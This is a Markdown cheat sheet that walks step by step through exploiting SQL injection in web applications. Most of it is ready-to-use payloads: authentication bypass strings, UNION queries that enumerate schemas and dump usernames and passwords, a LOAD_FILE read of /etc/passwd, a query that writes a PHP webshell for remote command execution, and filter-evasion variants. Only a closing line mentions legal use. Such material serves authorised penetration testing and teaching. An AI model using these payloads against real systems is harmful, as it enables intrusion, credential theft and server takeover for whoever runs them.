# SQL Injection Exploitation Cheat Sheet

## 🛠️ Step-by-Step Manual SQL Injection Exploitation

---

## 1️⃣ Identify SQL Injection Vulnerability

### **Basic Testing Payloads**
Try these in input fields (username, search, etc.) or URL parameters:

```sql
' OR 1=1 --  
" OR 1=1 --  
' OR 'a'='a' --  
" OR "a"="a" --  
' OR 1=1#  
```

### **Boolean-based SQLi (True/False Response)**
```sql
' AND 1=1 --  -- ✅ should return normal page
' AND 1=0 --  -- ❌ should return error or different response
```

### **Error-Based SQLi (Extract Information)**
```sql
' AND (SELECT 1/0) --   -- Division by zero error
' UNION SELECT 1, @@version --  -- Retrieves database version
```

### **Time-Based SQLi (Blind SQLi)**
If no visible errors, use time delays:
```sql
' OR IF(1=1, SLEEP(5), 0) --   -- MySQL
' OR pg_sleep(5) --            -- PostgreSQL
' OR WAITFOR DELAY '00:00:05' --  -- MSSQL
```

---

## 2️⃣ Determine Database Type

Use these queries to detect the DBMS:

```sql
SELECT @@version;           -- MySQL, MSSQL
SELECT version();           -- PostgreSQL
SELECT banner FROM v$version; -- Oracle
SELECT database();          -- MySQL
SELECT db_name();           -- MSSQL
```

---

## 3️⃣ Find Number of Columns

Use `ORDER BY` or `UNION SELECT`:

```sql
' ORDER BY 1 --  
' ORDER BY 2 --  
' ORDER BY 3 --  -- Keep increasing until error
```

Alternatively, use `UNION SELECT`:

```sql
' UNION SELECT NULL --  
' UNION SELECT NULL, NULL --  
' UNION SELECT NULL, NULL, NULL --  -- Keep increasing NULLs
```

Once found, use it for data extraction.

---

## 4️⃣ Extract Database Information

### **Find Database Name**
```sql
' UNION SELECT 1, database() --  -- MySQL
' UNION SELECT 1, db_name() --   -- MSSQL
' UNION SELECT 1, current_database() --  -- PostgreSQL
```

### **Find Table Names**
```sql
' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --  
```

### **Find Column Names**
```sql
' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --  
```

---

## 5️⃣ Dump Sensitive Data

```sql
' UNION SELECT 1, username, password FROM users --  
```

If passwords are hashed, try cracking them with `hashcat` or `john`.

---

## 6️⃣ Bypass Authentication

```sql
' OR '1'='1' --  
admin' --  
admin' #  
admin' OR '1'='1' --  
```

---

## 7️⃣ Upload a Webshell (MySQL)

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --  
```

Access via `http://target.com/shell.php?cmd=whoami`

---

## 8️⃣ Privilege Escalation via SQLi

### **Check User Privileges**
```sql
' UNION SELECT user, host FROM mysql.user --  
' UNION SELECT 1, user(), 2 --  
' UNION SELECT 1, current_user(), 2 --  
```

### **Enable File Read/Write**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd') --  
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php' --  
```

---

## 9️⃣ Evading WAFs & Filters

### **Bypass Quotes**
```sql
admin' --  -- ✅ Works normally
admin'/**/--  -- ✅ Comments help bypass filters
```

### **Bypass Keyword Filters**
```sql
UNION/**/SELECT/**/1,2,3 --  
'UNION'+'SELECT'+1,2,3 --  
```

### **Hex Encoding (MySQL)**
```sql
' UNION SELECT 1, 0x61646d696e, 0x70617373776f7264 --  -- Hex for 'admin', 'password'
```
### **Additional**
Finding all databases
```
' UNION SELECT 1, schema_name FROM information_schema.schemata --  
```
---

## 🔚 Final Notes

- Automate with `sqlmap` if allowed:
  ```sh
  sqlmap -u "http://target.com/index.php?id=1" --dbs
  ```
- Be ethical! Use only in **legal** environments (e.g., CTF, labs, bug bounties).
- Consider WAF bypass techniques if needed.

---
